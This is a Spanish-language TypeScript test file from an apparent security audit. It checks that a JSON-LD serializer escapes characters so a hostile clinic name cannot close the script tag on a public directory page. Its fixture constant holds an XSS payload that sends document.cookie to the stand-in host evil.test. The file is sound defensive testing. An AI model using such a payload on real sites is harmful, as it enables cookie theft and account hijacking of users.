// A1 (auditoría 30-sep-2026): un nombre de clínica con «</script><script>…» no
// puede cerrar el <script type="application/ld+json"> del directorio público.
import test from "node:test";
import assert from "node:assert/strict";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { serializeJsonLd } from "../json-ld";

const ATAQUE = '</script><script>fetch("//evil.test/?c="+document.cookie)</script>';

test("serializeJsonLd: el nombre hostil no deja ningún «<» ni «>» en el HTML inyectado", () => {
  const ld = {
    "@context": "https://schema.org",
    "@type": "ItemList",
    name: `Dentistas en ${ATAQUE}`,
    itemListElement: [{ "@type": "ListItem", position: 1, name: ATAQUE }],
  };
  const html = serializeJsonLd(ld);
  assert.ok(!html.includes("<"), "no debe quedar «<»");
  assert.ok(!html.includes(">"), "no debe quedar «>»");
  assert.ok(!/<\/script/i.test(html));
  // Y sigue siendo JSON equivalente: Google lee exactamente lo mismo.
  assert.deepEqual(JSON.parse(html), ld);
});

test("serializeJsonLd: escapa también «&», U+2028 y U+2029, y no rompe el JSON", () => {
  const ld = { name: "A & B \u2028 \u2029 <!-- -->" };
  const html = serializeJsonLd(ld);
  assert.ok(!/[<>&\u2028\u2029]/.test(html));
  assert.deepEqual(JSON.parse(html), ld);
});

test("serializeJsonLd: undefined no produce la palabra «undefined» en el script", () => {
  assert.equal(serializeJsonLd(undefined), "null");
});

function archivos(dir: string, acc: string[] = []): string[] {
  for (const n of readdirSync(dir)) {
    if (n === "node_modules" || n === "__tests__") continue;
    const p = join(dir, n);
    if (statSync(p).isDirectory()) archivos(p, acc);
    else if (p.endsWith(".tsx")) acc.push(p);
  }
  return acc;
}

test("ningún <script type=\"application/ld+json\"> del sitio inyecta JSON.stringify a pelo", () => {
  const malos: string[] = [];
  for (const f of archivos(join(process.cwd(), "src"))) {
    const src = readFileSync(f, "utf8");
    if (!src.includes("application/ld+json")) continue;
    // Cada __html de un bloque ld+json debe salir de un serializador que escapa «<».
    for (const m of src.matchAll(/__html:\s*([^}]+)\}/g)) {
      const expr = m[1].trim();
      if (/JSON\.stringify/.test(expr) && !/replace\(\s*\/</.test(expr)) malos.push(`${f}: ${expr}`);
    }
  }
  assert.deepEqual(malos, []);
});

test("las páginas del directorio usan el serializador único", () => {
  for (const f of [
    "src/app/descubre/[categoria]/[ciudad]/page.tsx",
    "src/app/descubre/[categoria]/page.tsx",
    "src/app/descubre/clinica/[slug]/page.tsx",
    "src/app/descubre/page.tsx",
  ]) {
    const src = readFileSync(join(process.cwd(), f), "utf8");
    assert.match(src, /serializeJsonLd\(/, f);
    assert.doesNotMatch(src, /__html:\s*JSON\.stringify/, f);
  }
});
